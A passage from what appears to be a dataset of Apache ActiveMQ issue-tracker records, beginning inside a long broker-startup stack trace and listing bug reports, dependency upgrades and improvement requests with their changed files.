org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:934)&#91;spring-context-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)&#91;spring-context-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)&#91;xbean-spring-3.18.jar:3.18&#93;    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)&#91;xbean-spring-3.18.jar:3.18&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:104)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:104)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:67)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)&#91;activemq-broker-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)&#91;activemq-broker-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:87)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:154)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)&#91;:1.7.0_76&#93;    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)&#91;:1.7.0_76&#93;    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)&#91;:1.7.0_76&#93;    at java.lang.reflect.Method.invoke(Method.java:606)&#91;:1.7.0_76&#93;    at org.apache.activemq.console.Main.runTaskClass(Main.java:262)&#91;activemq.jar:5.12.0&#93;    at org.apache.activemq.console.Main.main(Main.java:115)&#91;activemq.jar:5.12.0&#93;2015-09-14 23:02:07,728 | Failed to load: class path resource &#91;activemq.xml&#93;, reason: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerExceptionorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerException    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1514)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:521)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:223)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:191)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:636)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:934)&#91;spring-context-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)&#91;spring-context-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)&#91;xbean-spring-3.18.jar:3.18&#93;    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)&#91;xbean-spring-3.18.jar:3.18&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:104)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:104)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:67)&#91;activemq-spring-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)&#91;activemq-broker-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)&#91;activemq-broker-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:87)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:154)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)&#91;activemq-console-5.12.0.jar:5.12.0&#93;    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)&#91;:1.7.0_76&#93;    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)&#91;:1.7.0_76&#93;    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)&#91;:1.7.0_76&#93;    at java.lang.reflect.Method.invoke(Method.java:606)&#91;:1.7.0_76&#93;    at org.apache.activemq.console.Main.runTaskClass(Main.java:262)&#91;activemq.jar:5.12.0&#93;    at org.apache.activemq.console.Main.main(Main.java:115)&#91;activemq.jar:5.12.0&#93;ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerExceptionjava.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerException    at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:91)    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)    at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:154)    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)    at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    at java.lang.reflect.Method.invoke(Method.java:606)    at org.apache.activemq.console.Main.runTaskClass(Main.java:262)    at org.apache.activemq.console.Main.main(Main.java:115)Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerException    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1514)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:521)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293)    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:223)    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290)    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:191)    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:636)    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:934)    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)    at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:104)    at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:104)    at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:67)    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)    at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:87)    ... 10 moreCaused by: java.lang.RuntimeException: java.lang.NullPointerException    at org.apache.activemq.broker.BrokerService.getJobSchedulerStore(BrokerService.java:1894)    at org.apache.activemq.xbean.XBeanBrokerService.ensureSystemUsageHasStore(XBeanBrokerService.java:91)    at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:71)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    at java.lang.reflect.Method.invoke(Method.java:606)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1640)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1581)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1511)    ... 27 moreCaused by: java.lang.NullPointerException    at org.apache.activemq.leveldb.replicated.ProxyLevelDBStore.createJobSchedulerStore(ProxyLevelDBStore.scala:49)    at org.apache.activemq.broker.BrokerService.getJobSchedulerStore(BrokerService.java:1884)    ... 36 moreERROR: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerExceptionorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerException    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1514)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:521)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293)    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:223)    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290)    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:191)    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:636)    at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:934)    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:479)    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)    at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)    at org.apache.activemq.xbean.XBeanBrokerFactory$1.<init>(XBeanBrokerFactory.java:104)    at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:104)    at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:67)    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)    at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)    at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:87)    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)    at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:154)    at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:62)    at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:104)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    at java.lang.reflect.Method.invoke(Method.java:606)    at org.apache.activemq.console.Main.runTaskClass(Main.java:262)    at org.apache.activemq.console.Main.main(Main.java:115)Caused by: java.lang.RuntimeException: java.lang.NullPointerException    at org.apache.activemq.broker.BrokerService.getJobSchedulerStore(BrokerService.java:1894)    at org.apache.activemq.xbean.XBeanBrokerService.ensureSystemUsageHasStore(XBeanBrokerService.java:91)    at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:71)    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)    at java.lang.reflect.Method.invoke(Method.java:606)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1640)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1581)    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1511)    ... 27 moreCaused by: java.lang.NullPointerException    at org.apache.activemq.leveldb.replicated.ProxyLevelDBStore.createJobSchedulerStore(ProxyLevelDBStore.scala:49)    at org.apache.activemq.broker.BrokerService.getJobSchedulerStore(BrokerService.java:1884)    ... 36 more
issueID:AMQ-5972
type:Bug
changed files:
texts:Policy entries not applied in correct order
When we have multiple policy entries with wildcards that matches a single destination, we want the most specific one to be applied. In some cases at the moment, the wrong policy can be applied. For example     <policyMap>       <policyEntries>         <policyEntry queue="DomainA.DomainB.>" memoryLimit="20mb" />         <policyEntry queue="DomainA.DomainB.*.*.Prioritised.Queue" memoryLimit="5000000" prioritizedMessages="true" />       </policyEntries>     </policyMap>
issueID:AMQ-5973
type:Sub-task
changed files:
texts:Update Spring Framework version
Update to a more recent version of the Spring Framework
issueID:AMQ-5974
type:Sub-task
changed files:
texts:Update Mockito to latest
Update Mockito to latest release
issueID:AMQ-5976
type:Improvement
changed files:
texts:Filter queues by name in admin webconsole
When the number of queues in the broker gets somewhat large, I found that the queues list in admin webconsole becomes somewhat cumbersome, especially if one wants to monitor some queues.I wrote a simple filter for this page (using only JSP/HTML and get method), enabling to filter the queues by queue name. No impact on the server (all queues are still queried), it just filters out the result.
issueID:AMQ-5977
type:Improvement
changed files:
texts:Init script should provide LSB headers
The current init script "bin/activemq" (https://github.com/apache/activemq/blob/master/assembly/src/release/bin/activemq) does not provide any LSB headers. Because of this, setting up the service using chkconfig on RHEL and clones as described in the documentation (see http://activemq.apache.org/unix-shell-script.html) fails with the following error message:$ chkconfig --add activemqservice activemq does not support chkconfigUbuntu systems will print the following warning:$ update-rc.d activemq defaultsupdate-rc.d: warning: /etc/init.d/activemq missing LSB informationupdate-rc.d: see <http://wiki.debian.org/LSBInitScripts> Adding system startup for /etc/init.d/activemq ...[...]
issueID:AMQ-5980
type:Sub-task
changed files:StompWSConnection.java
texts:Update to the latest Jetty version
Jetty is outdated and causing problems with JDK 8 as seen in AMQ-5356, so it should be updated to the latest.
issueID:AMQ-5981
type:Sub-task
changed files:
texts:Update to Karaf 4
We need to update to Karaf 4 to support Jetty 9.2.x
issueID:AMQ-5982
type:Sub-task
changed files:
texts:Updated Netty to the latest
Netty should be updated to the latest version.
issueID:AMQ-5983
type:Bug
changed files:
texts:Restoring MQTT client virtual topic queue uses wrong prefix.
Restoring durable queues on mqtt client connect is broker as it does not lookup for queues properly. This can lead to wrong subscriptions on virtual topic queues.
issueID:AMQ-5984
type:Bug
changed files:KahaDBStore.java
texts:Unsafe use of access-order LinkedHashMap via  ActiveMQMessageAuditNoSync - can lead to loop and hang
A thread looping in"ActiveMQ Transport: tcp:///xxx:yyy@61616" daemon prio=10 tid=0x00007efff40a3000 nid=0x74f0 runnable [0x00007eff6f0f9000]   java.lang.Thread.State: RUNNABLE at java.util.LinkedHashMap.transfer(LinkedHashMap.java:253) at java.util.HashMap.resize(HashMap.java:581) at java.util.HashMap.addEntry(HashMap.java:879) at java.util.LinkedHashMap.addEntry(LinkedHashMap.java:427) at java.util.HashMap.put(HashMap.java:505) at org.apache.activemq.ActiveMQMessageAuditNoSync.isDuplicate(ActiveMQMessageAuditNoSync.java:133) at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1238) at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2196) at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1141) at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779) at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1137) at org.apache.activemq.store.kahadb.MessageDatabase$10.visit(MessageDatabase.java:1005) at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)....points to the need for a write lock on access to the LRUCache used for duplicate detection for failover producers.The index lock protects modifications on put etc but clearly a get needs to have exclusive access. Tis in the javadoc in bold - "In access-ordered linked hash maps, merely querying the map with get is a structural modification"
issueID:AMQ-5990
type:Bug
changed files:PooledConnectionFactory.java
ConnectionPool.java
texts:PooledConnectionFactory does not allow disabling JMX on GenericKeyObjectPool
initConnectionPool does not allow us to configure the GenericKeyObjectPool.Suggestion:PooledConnectionFactoryprivate GenericKeyedObjectPoolConfig config;public void setBasePoolConfig(final GenericKeyedObjectPoolConfig config) {        this.config = config;}public void initConnectionsPool() {     if (this.connectionsPool == null) {            this.connectionsPool = new GenericKeyedObjectPool<ConnectionKey, ConnectionPool>(blah, config==null?new GenericKeyedObjectPoolConfig():config);     }}protected ConnectionPool createConnectionPool(Connection connection) {        return new ConnectionPool(connection, config);    }ConnectionPoolpublic ConnectionPool(Connection connection) {      this(connection, new GenericKeyedObjectPoolConfig());}public ConnectionPool(Connection connection, GenericKeyedObjectPoolConfig config) {      this.connection = wrap(connection);      this.sessionPool = new GenericKeyedObjectPool<SessionKey, SessionHolder>(blah, config==null?new GenericKeyedObjectPoolConfig():config);}
issueID:AMQ-5994
type:Bug
changed files:
texts:Broker can&#39;t recover Durable Subscription on index deletion
The broker is unable to recover a durable subscription when replaying the journal to rebuild the index, if the original index was deleted.  The problem is that when the index is recovered, any KahaSubscriptionCommand is ignored so the messages are never recovered because when the messages are replayed the subscriptions don"t exist.I modified AMQ4212Test.java to demonstrate this issue and I have attached it.It looks like the fix for AMQ-4000 is what introduces this problem. The commit for that issue is is : https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=0061f6f75538ede8fe3443925e64beb839abfb90
issueID:AMQ-5996
type:Bug
changed files:
texts:Durable subscription no updated when reactivated sub changes noLocal value
When a durable subscription that was offline is reactivated and the selector or noLocal value is changed the subscription is supposed to be removed and re-added as if it was a new subscription.  We currently handle the selector part to a certain extent but the DurableSubscription instance that backs the offline durable sub contains a selectorExpression that is not updated so subscription will not apply the new selector value unless the broker was restarted before the reactivation.  We don"t as of yet handle the change of noLocal on the subscription due to the fact that prior to v5.12.0 the value was not stored in the persistence layer.  Now that we store the noLocal value we can check that along with the selector and update the subscription, which also needs to update the selectorExpression as the noLocal value is filtered via its own expression on the selector chain.
issueID:AMQ-5997
type:Improvement
changed files:pom.xml
MQTTProtocolConverter.java
texts:MQTT legacy client support
MQTT 3.1.1 spec defines that UNSUBSCRIBE packet needs to define AT_LEAST_ONCE (01) for fixed header QoS bits. But older clients might set those to some different value, like AT_MOST_ONCE. At the moment, the mqtt-client lib will try to have this case differently and we"ll get ProtocolException: Invalid message encodingerror.The solution is to make mqtt client parse these other values regularly and introduce the necessary checks for 3.1.1 spec version in the broker.
issueID:AMQ-5998
type:Sub-task
changed files:
texts:Upgrade Pax-url to version 2.4.3
Just a little upgrade of Pax-url to version 2.4.3I"d like to take care of this PR.
issueID:AMQ-600
type:Bug
changed files:ActiveMQConnection.java
texts:Broker will not release a persistant clientId if a network connection is broken then restored at the TCP layer from a remote client
During long-term operation, a remote, publish-only client with a TCP socket connection to the JMS broker will occasionally be disconnected at a low level (i.e. below the application level where JMS runs).  When this occurs, the JMS broker throws an exception indicating a broken socket, but does not release the clientID of the client to allow for reconnects.  The following stack traces should demonstrate this failure mode: INFO  Service                        - Async error occurred: java.net.SocketException: Connection resetjava.net.SocketException: Connection reset        at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:96)        at java.net.SocketOutputStream.write(SocketOutputStream.java:136)        at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:108)        at java.io.DataOutputStream.flush(DataOutputStream.java:106)        at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:118)        at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:90)        at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:65)        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:44)        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:54)        at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:212)        at org.apache.activemq.broker.AbstractConnection.dispatchSync(AbstractConnection.java:517)        at org.apache.activemq.broker.AbstractConnection.dispatchAsync(AbstractConnection.java:535)        at org.apache.activemq.broker.region.TopicSubscription.dispatch(TopicSubscription.java:142)        at org.apache.activemq.broker.region.TopicSubscription.add(TopicSubscription.java:54)        at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:50)        at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:365)        at org.apache.activemq.broker.region.Topic.send(Topic.java:247)        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:195)        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:312)        at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:192)        at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:107)        at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:97)        at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:119)        at org.apache.activemq.broker.AbstractConnection.processMessage(AbstractConnection.java:336)        at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:508)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)        at java.lang.Thread.run(Thread.java:595)ACTIVEMQ_HOME: /opt/activemqLoading message broker from: xbean:activemq.xmlINFO  BrokerService                  - ActiveMQ 4.0-M4 JMS Message Broker (localhost) is startingINFO  BrokerService                  - For help or more information please see: http://www.logicblaze.comINFO  JDBCPersistenceAdapter         - Database driver recognized: &#91;apache_derby_embedded_jdbc_driver&#93;INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active Journal: using 5 x 20.0 Megs at: ../activemq-data/journalINFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in transactions recovered.INFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61616INFO  TransportConnector             - Accepting connection on: tcp://s1:61616WARN  MulticastDiscoveryAgent        - brokerName not setINFO  TransportServerThreadSupport   - Listening for connections at: tcp://s1:61617?wireFormat=stompINFO  TransportConnector             - Accepting connection on: tcp://s1:61617?wireFormat=stompINFO  BrokerService                  - ActiveMQ JMS Message Broker (localhost) startedINFO  NetworkConnector               - Establishing network connection between vm://localhost?network=true and null at failover:tcp://s1:61616INFO  VMTransportFactory             - binding to broker: localhostINFO  TransportConnector             - Accepting connection on: vm://localhostINFO  DemandForwardingBridge         - Starting a network connection between vm://localhost#0 and unconnected has been established.INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmiINFO  DemandForwardingBridge         - Disconnecting loop back connection.INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connectedjavax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:77)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:136)        at java.lang.Thread.run(Thread.java:595)INFO  Service                        - Sync error occurred: javax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connectedjavax.jms.InvalidClientIDException: Broker: localhost - Client: TESTClient already connected        at org.apache.activemq.broker.region.RegionBroker.addConnection(RegionBroker.java:153)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)        at org.apache.activemq.advisory.AdvisoryBroker.addConnection(AdvisoryBroker.java:66)        at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:63)        at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:75)        at org.apache.activemq.broker.AbstractConnection.processAddConnection(AbstractConnection.java:478)        at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:82)        at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:106)        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:189)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:60)        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:82)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:105)        at 